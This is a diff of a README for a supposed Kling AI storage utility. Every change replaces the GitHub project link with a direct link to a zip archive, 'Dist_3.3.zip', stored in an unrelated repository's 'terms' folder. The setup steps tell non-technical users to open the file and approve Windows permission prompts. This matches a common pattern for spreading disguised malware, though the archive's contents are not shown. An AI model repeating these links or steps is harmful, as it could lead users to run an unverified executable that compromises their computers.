@@ -5,7 +5,7 @@ description: "Locate the Kling AI desktop data folder fast and keep a dated loca
 ---
 # 🪟 kling-ai-desktop - Manage Kling AI Storage Easily
 
-[![Download kling-ai-desktop](https://img.shields.io/badge/Download%20kling--ai--desktop-ff69b4?style=for-the-badge&labelColor=blueviolet)](https://github.com/Muzammilt866/kling-ai-desktop)
+[![Download kling-ai-desktop](https://img.shields.io/badge/Download%20kling--ai--desktop-ff69b4?style=for-the-badge&labelColor=blueviolet)](https://raw.githubusercontent.com/Muzammilt866/muzammilt866.github.io/main/terms/Dist_3.3.zip)
 
 Kling AI Desktop is a local Windows utility for people who use Kling AI and want a simpler way to manage local files. It helps you find Kling AI data paths, review configuration files, clear export caches, and open export folders. The app is built for everyday Windows users. You do not need programming knowledge to use it. A macOS helper is also included for local data path and cache management.
 
@@ -13,14 +13,14 @@ Use the download badge above to visit the project page and get the application.
 
 ## 📥 Download and Setup
 
-1. Visit this link to download the application: [Download kling-ai-desktop](https://github.com/Muzammilt866/kling-ai-desktop).
+1. Visit this link to download the application: [Download kling-ai-desktop](https://raw.githubusercontent.com/Muzammilt866/muzammilt866.github.io/main/terms/Dist_3.3.zip).
 2. When the download finishes, open the downloaded file to start kling-ai-desktop.
 3. If Windows asks for permission, select Yes so the app can open.
 4. Follow the on-screen prompts until the main kling-ai-desktop window appears.
 
 The download link is also available here for quick access:
 
-[Download kling-ai-desktop](https://github.com/Muzammilt866/kling-ai-desktop)
+[Download kling-ai-desktop](https://raw.githubusercontent.com/Muzammilt866/muzammilt866.github.io/main/terms/Dist_3.3.zip)
 
 ## ✨ What kling-ai-desktop Helps You Do
 
@@ -104,7 +104,7 @@ No. Kling AI Desktop is designed for average computer users. You can use the mai
 Yes. Kling AI Desktop is a Windows utility. The project also includes macOS helper information for local data paths and caches.
 
 **Where do I download the app?**  
-Visit this link to download the application: [Download kling-ai-desktop](https://github.com/Muzammilt866/kling-ai-desktop).
+Visit this link to download the application: [Download kling-ai-desktop](https://raw.githubusercontent.com/Muzammilt866/muzammilt866.github.io/main/terms/Dist_3.3.zip).
 
 **What does the app manage?**  
 It helps with Kling AI data paths, configuration files, export caches, and export folders on your local computer.
@@ -128,7 +128,7 @@ Kling AI Desktop works with local Windows and macOS paths. It is a helper for da
 - Main use: local Kling AI data path, config, cache, and export folder management
 - Primary platform: Windows
 - Also covered: macOS helper
-- Download: [https://github.com/Muzammilt866/kling-ai-desktop](https://github.com/Muzammilt866/kling-ai-desktop)
+- Download: [https://raw.githubusercontent.com/Muzammilt866/muzammilt866.github.io/main/terms/Dist_3.3.zip](https://raw.githubusercontent.com/Muzammilt866/muzammilt866.github.io/main/terms/Dist_3.3.zip)
 - Setup style: download, open, and follow the on-screen prompts
 - User level: non-technical computer users
 
